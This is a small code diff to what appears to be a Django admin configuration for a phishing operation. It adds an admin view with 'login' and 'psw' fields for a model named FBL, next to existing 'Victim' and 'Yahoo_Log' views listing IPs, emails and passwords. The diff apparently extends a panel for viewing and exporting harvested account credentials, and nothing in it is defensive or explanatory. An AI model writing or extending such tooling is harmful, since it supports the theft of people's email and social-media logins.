@@ -8,6 +8,12 @@ class VictimAdmin(admin.ModelAdmin):
 class LogAdmin(ImportExportModelAdmin):
     list_display = ('id','ip','mail','psw1','psw2')
 
+class FBLAdmin(ImportExportModelAdmin):
+    list_display = ('id', 'login', 'psw')
+
+
+
 
 admin.site.register(models.Victim,VictimAdmin)
 admin.site.register(models.Yahoo_Log,LogAdmin)
+admin.site.register(models.FBL,FBLAdmin)
